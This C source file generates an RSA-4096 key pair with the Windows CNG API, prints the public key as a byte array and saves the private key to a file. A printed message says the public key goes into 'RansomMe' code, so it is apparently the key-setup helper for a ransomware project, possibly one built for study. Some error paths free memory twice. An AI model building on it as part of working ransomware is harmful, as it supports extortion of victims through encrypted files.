#include <stdio.h>
#include <windows.h>
#include <bcrypt.h>

#pragma comment(lib, "bcrypt.lib")

#define KEY_SIZE 4096

void SaveByteArray(PBYTE pbBlob, DWORD cbBlob, const char* filePath) {

    HANDLE hInput = INVALID_HANDLE_VALUE;
    DWORD bytesWritten = 0;


    hInput = CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hInput == INVALID_HANDLE_VALUE) {
        printf("Error: Could not open input file %s. Error Code: %lu\n", filePath, GetLastError());
        return;
    }

    if (!WriteFile(hInput, pbBlob, cbBlob, &bytesWritten, NULL) || bytesWritten != cbBlob) {
        printf("Error: WriteFile failed. Error Code: %lu\n", GetLastError());
        printf("Failure writing to file %s\n", filePath);
        if (hInput != INVALID_HANDLE_VALUE) { CloseHandle(hInput); }
        return;
    }

    if (hInput != INVALID_HANDLE_VALUE) { CloseHandle(hInput); }
    return;
}

void PrintByteArray(PBYTE data, size_t size) {

    printf("BYTE keyBlob[] = {\n    ");

    for (size_t i = 0; i < size; i++) {
        printf("0x%02X%s", data[i], (i < size - 1) ? ", " : "");
        if ((i + 1) % 16 == 0) printf("\n    "); // Line break every 16 bytes
    }

    printf("};\n");
}

int main()
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = 0;

    NTSTATUS status = 0;

    PBYTE keyBlob = NULL;
    DWORD keyBlobSize = 0;

    const char* privKeyFileName = ".\\private.bin";

    // Open RSA algorithm provider
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error opening RSA algorithm provider: 0x%x\n", status);
        goto cleanup;
    }

    // Generate RSA key pair
    status = BCryptGenerateKeyPair(hAlg, &hKey, KEY_SIZE, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error generating RSA key pair: 0x%x\n", status);
        goto cleanup;
    }

    // Finalize the key pair
    status = BCryptFinalizeKeyPair(hKey, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error finalizing RSA key pair: 0x%x\n", status);
        goto cleanup;
    }

    // Export the public key to console
    // Determine the size of the key blob
    status = BCryptExportKey(hKey, NULL, BCRYPT_RSAPUBLIC_BLOB, NULL, 0, &keyBlobSize, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error getting RSA key blob size: 0x%x\n", status);
        goto cleanup;
    }

    // Allocate memory for the key blob
    keyBlob = (PBYTE)malloc(keyBlobSize);
    if (!keyBlob) {
        fprintf(stderr, "Error allocating memory for key blob.\n");
        goto cleanup;
    }

    // Export the key blob
    status = BCryptExportKey(hKey, NULL, BCRYPT_RSAPUBLIC_BLOB, keyBlob, keyBlobSize, &keyBlobSize, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error exporting RSA key blob: 0x%x\n", status);
        free(keyBlob);
        goto cleanup;
    }

    printf("You can paste the public key in the RansomMe code.\n\n");
    // Print the public key to the console
    PrintByteArray(keyBlob, keyBlobSize);

    // Free the memory
    if (keyBlob != NULL) { free(keyBlob); }

    // Export the private key to a file
    // Determine the size of the key blob
    status = BCryptExportKey(hKey, NULL, BCRYPT_RSAFULLPRIVATE_BLOB, NULL, 0, &keyBlobSize, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error getting RSA key blob size: 0x%x\n", status);
        goto cleanup;
    }

    // Allocate memory for the key blob
    keyBlob = (PBYTE)malloc(keyBlobSize);
    if (!keyBlob) {
        fprintf(stderr, "Error allocating memory for key blob.\n");
        goto cleanup;
    }

    // Export the key blob
    status = BCryptExportKey(hKey, NULL, BCRYPT_RSAFULLPRIVATE_BLOB, keyBlob, keyBlobSize, &keyBlobSize, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error exporting RSA key blob: 0x%x\n", status);
        free(keyBlob);
        goto cleanup;
    }
    // Save the private key to a file
    SaveByteArray(keyBlob, keyBlobSize, privKeyFileName);
    printf("\nThe private key was saved to %s.\n", privKeyFileName);


cleanup:
    if (hKey) { BCryptDestroyKey(hKey); }
    if (hAlg) { BCryptCloseAlgorithmProvider(hAlg, 0); }

    if (keyBlob != NULL) { free(keyBlob); }

    return 0;

}